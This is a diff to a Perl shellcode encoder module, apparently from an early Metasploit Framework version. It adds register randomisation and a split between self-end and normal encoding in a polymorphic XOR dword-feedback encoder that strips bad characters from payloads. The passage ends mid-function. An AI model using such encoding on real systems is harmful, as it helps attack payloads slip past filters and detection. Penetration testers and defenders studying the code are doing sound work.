@@ -5,11 +5,13 @@ use base 'Msf::Encoder';
 use Pex::Encoder;
 use Pex::Poly::BlockMaster;
 use Pex::Poly::DeltaKing;
+use Pex::Poly::RegAssassin;
 
 my $bmb = 'Pex::Poly::BlockMaster::Block';
 my $bm = 'Pex::Poly:BlockMaster';
 
 my $advanced = {
+  'EndEncode' => [0, 'Encode last 4 bytes of decoder'],
 };
 
 my $info = {
@@ -29,7 +31,23 @@ sub new {
 
 sub EncodePayload {
   my $self = shift;
-  return($self->_EncodeSelfEnd(@_));
+  return($self->_EncodeSelfEnd(@_)) if($self->GetLocal('EndEncode'));
+  return($self->_EncodeNormal(@_));
+}
+sub _BuildDelta {
+  my $self = shift;
+  my $rawshell = shift;
+  my $badChars = shift;
+  my $bm = $self->_BuildBM(length($rawshell));
+  my $decoder = $bm->Build;
+  my $assassin = Pex::Poly::RegAssassin->new;
+  $assassin->AddData($decoder);
+  # no ecx, ebp, or esp
+  $assassin->AddSet(['KEYREG', 'ADDRREG'], [0, 2, 3, 6, 7]);
+  $decoder = $assassin->Build;
+  my $delta = Pex::Poly::DeltaKing->new;
+  $delta->AddData($decoder);
+  return($delta);
 }
 
 sub _EncodeSelfEnd {
@@ -37,17 +55,41 @@ sub _EncodeSelfEnd {
   my $rawshell = shift;
   my $badChars = shift;
 
-  my $bm = $self->_BuildBM(length($rawshell));
-  my $decoder = $bm->Build;
-  $decoder =~ s/\|\|KEYREG\|\|/0/sg;
-  $decoder =~ s/\|\|ADDRREG\|\|/3/sg;
-  print STDERR $decoder;
-  my $delta = Pex::Poly::DeltaKing->new;
-  $delta->AddData($decoder);
-  $decoder = $delta->Build;
+  my $decoder = $self->_BuildDelta($rawshell, $badChars)->Build;
 
   my $end = substr($decoder, -4, 4, '');
   $rawshell = $end . $rawshell;
+
+  my $xorkey = Pex::Encoder::KeyScanXorDwordFeedback($rawshell, $badChars);
+  if(!$xorkey) {
+    $self->PrintDebugLine(3, 'Failed to find xor key');
+    return;
+  }
+
+  my $xordat = Pex::Encoder::XorDwordFeedback($xorkey, $rawshell);
+
+  $xorkey = pack('V', $xorkey);
+  $decoder =~ s/XORK/$xorkey/s;
+
+  my $shellcode = $decoder . $xordat;
+
+  my $pos = Pex::Text::BadCharIndex($badChars, $shellcode);
+  if($pos != -1) {
+    print Pex::Text::BufferC($shellcode);
+    $self->PrintDebugLine(3, 'Bad char at pos ' . $pos);
+    $self->PrintDebugLine(3, sprintf('Bad byte %i', ord(substr($shellcode, $pos, 1))));
+    return;
+  }
+
+  return($shellcode);
+}
+
+sub _EncodeNormal {
+  my $self = shift;
+  my $rawshell = shift;
+  my $badChars = shift;
+
+  my $decoder = $self->_BuildDelta($rawshell, $badChars)->Build;
 
   my $xorkey = Pex::Encoder::KeyScanXorDwordFeedback($rawshell, $badChars);
   if(!$xorkey) {
